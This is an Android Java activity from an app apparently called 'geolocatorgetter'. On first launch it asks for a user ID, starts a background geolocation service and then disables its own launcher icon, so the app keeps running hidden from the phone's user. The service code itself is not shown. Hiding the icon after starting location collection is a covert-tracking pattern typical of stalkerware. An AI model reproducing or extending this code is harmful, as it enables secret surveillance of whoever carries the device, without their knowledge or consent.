package ru.astar.geolocatorgetter;

import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.EditText;

public class MainActivity extends AppCompatActivity {


    private static final String TAG = "Main Activity";

    private Intent intentService;
    private boolean isContains;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        intentService = new Intent(this, GeoGetService.class);
        final SharedPreferences preferences = getSharedPreferences(Util.PREF_APP, MODE_PRIVATE);

        if (preferences != null) {
            isContains = preferences.contains(Util.PREF_FIRST_RUN);
            if (!isContains) {
                final View view = getLayoutInflater().inflate(R.layout.userid_layout, null);

                AlertDialog.Builder aDialog = new AlertDialog.Builder(this);
                aDialog.setTitle("Первый запуск");
                aDialog.setView(view);
                aDialog.setNegativeButton("OK", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        int userId = 0;

                        try {
                            EditText userIdEdit = (EditText) view.findViewById(R.id.editUserId);
                            userId = Integer.parseInt(userIdEdit.getText().toString());
                        } catch (Exception e) {
                            Log.d(TAG, "Error: " + e.getMessage());
                            finish();
                        }

                        SharedPreferences.Editor editor = preferences.edit();
                        editor.putBoolean(Util.PREF_FIRST_RUN, true);
                        editor.putInt(Util.PREF_USER_ID, userId);
                        editor.commit();

                        if (!Util.isMyServiceRunning(getApplicationContext(), GeoGetService.class)) {
                            startService(intentService);
                        } else {
                            stopService(intentService);
                        }

                        ComponentName component = new ComponentName("ru.astar.geolocatorgetter", "ru.astar.geolocatorgetter.MainActivity");
                        getPackageManager().setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

                        finish();
                    }
                });
                aDialog.create();
                aDialog.show();
            }
        }
        if (isContains) {
            if (!Util.isMyServiceRunning(getApplicationContext(), GeoGetService.class)) {
                startService(intentService);
            } else {
                stopService(intentService);
            }
            finish();
        }
    }

}